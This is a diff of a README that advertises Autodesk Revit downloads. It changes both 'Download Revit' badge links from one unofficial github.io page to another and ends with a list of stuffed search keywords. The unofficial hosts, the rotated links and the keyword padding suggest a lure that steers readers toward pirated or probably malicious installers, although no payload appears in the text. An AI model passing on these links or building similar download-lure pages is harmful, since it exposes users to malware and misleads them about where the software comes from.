@@ -4,7 +4,7 @@
 
 ## 📥 Download Autodesk Revit for Windows
 
-[![⬇️ Download Revit](https://img.shields.io/badge/Download-Revit-blue?style=for-the-badge&logo=windows)](https://mitrobandus.github.io/.github/Autodesk)
+[![⬇️ Download Revit](https://img.shields.io/badge/Download-Revit-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/Autodesk)
 
 ---
 
@@ -30,7 +30,7 @@ Revit supports architectural modeling, structural engineering, MEP systems, and 
 
 Compatible with various rendering and coordination tools, Revit offers seamless design-to-delivery workflows across small and large-scale projects. Its intuitive environment and data-driven structure make it a core tool in modern architecture and engineering workflows.
 
-[![⬇️ Download Revit](https://img.shields.io/badge/Download-Revit-blue?style=for-the-badge&logo=windows)](https://mitrobandus.github.io/.github/Autodesk)
+[![⬇️ Download Revit](https://img.shields.io/badge/Download-Revit-blue?style=for-the-badge&logo=windows)](https://asdeennerhorse.github.io/mogus/Autodesk)
 
 ---
 
@@ -78,3 +78,4 @@ Compatible with various rendering and coordination tools, Revit offers seamless 
 autodesk revit, autodesk revit download, revit architecture, revit lt, autocad revit, bim revit, revit cost, autodesk bim360, revit licence, revit structure, autodesk revit student, diroots revit, autodesk revit bim, auto revit, autocad and revit, bim revit architecture, revit ar, autodesk revit education, revit architecture cost, lumion to revit, lumion and revit
 
 ---
+
